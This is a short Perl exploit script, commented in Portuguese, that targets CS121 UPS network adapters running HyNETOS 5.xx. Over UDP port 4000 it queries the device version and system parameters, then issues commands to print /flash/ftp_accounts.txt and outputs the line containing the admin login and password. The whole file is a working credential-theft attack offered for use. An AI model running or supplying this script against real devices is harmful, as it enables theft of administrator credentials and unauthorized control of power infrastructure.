#!/usr/bin/perl -w
#usado para explorar o usuário e senha do CS121 BL,B e F nas versões HyNETOS na versão 5.XX
use IO::Socket;      
use constant MAXBYTES => scalar 1024;      

$socket = IO::Socket::INET->new( PeerPort  => 4000,
                                 PeerAddr  => $ARGV[0],
                                 Type      => SOCK_DGRAM,
                                 Proto     => 'udp');

$socket->send("<VERSION>");
$socket->recv($inline, MAXBYTES);
print "UPS: $inline \n"; 

$socket->send("show syspar");
$socket->recv($inline, MAXBYTES);
print "$inline\n";

print "Searching login\n" ; 
$socket->send("start");
$socket->recv($inline, MAXBYTES);
$socket->send("cd /flash");
$socket->send("type ftp_accounts.txt"); 

while($socket->recv($inline, MAXBYTES)) { 
	 if($inline =~ /admin/ig) { print $inline; exit;  }
}

sleep(1);